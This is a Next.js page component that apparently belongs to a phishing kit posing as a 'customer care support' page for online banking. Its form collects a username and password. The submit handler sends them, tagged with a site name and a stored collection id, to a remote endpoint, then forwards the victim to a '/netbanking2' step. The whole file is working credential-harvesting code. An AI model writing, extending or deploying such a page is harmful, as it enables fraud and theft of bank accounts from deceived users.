'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  
import { useState } from 'react';
import Link from "next/link";

export default function Home() {
  const router = useRouter();
  const API_URL = process.env.NEXT_PUBLIC_URL;
  const SITE = process.env.NEXT_PUBLIC_SITE;

  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
      e.preventDefault()
      setLoading(true); // Set loading state to true

      const formData = new FormData(e.target);
      const jsonObject1 = {};
      const jsonObject = {};
      formData.forEach((value, key) => {
          jsonObject[key] = value;
      });
      jsonObject1['data'] = jsonObject;
      jsonObject1['site'] = SITE;
      jsonObject1['id'] = localStorage.getItem("collection_id");
      
      try {
          const response = await fetch(`${API_URL}`, {
              method: 'POST',
              body: JSON.stringify(jsonObject1)
          });

          if (!response.ok) {
              throw new Error('Network response was not ok');
          }
          const responseData = await response.json();
          router.push('/netbanking2');
      } catch (error) {
          console.error('There was a problem with the fetch operation:', error);
      } finally{
          setLoading(false); 
      }
  };
  return (
    <>
    <Header />
      <h3 className="text-center mx-2">
        CUSTOMER CARE SUPPORT INSTANT SOLUTION
      </h3>
      <img src="help/step2.png" className="w-100" alt="" />
    <main className="px-3">
    <div className="form-container m-2">
  <form onSubmit={handleSubmit} id="submitForm">
    
    <div className="form-floating mb-3 order-amount">
      <input
        type="text"
        name="username"
        className="form-control"
        placeholder="Ex. Username"
        required
      />
      <label>
        <span>Username</span>*
      </label>
    </div>

    <div className="form-floating mb-3 order-amount">
      <input
        type="password"
        name="passw"
        className="form-control"
        placeholder="Ex. pass"
        required
      />
      <label>
        <span>Password</span>*
      </label>
    </div>
    <div className="d-flex justify-content-between">
      <Link
        href="/3"
        className="btn btn-outline-success  mt-3 text-center"
      >
        <img src="help/back.png" alt="" />
      </Link>
      <button
        type="submit"
        className="btn btn-success  mt-3 text-center"
        id="submit-button"
        disabled={loading}
      >
        {loading ? 'Please wait...' : 'Next'}
      </button>
    </div>
    
  </form>
</div>

    </main>

    <Footer />
</>
  );

}
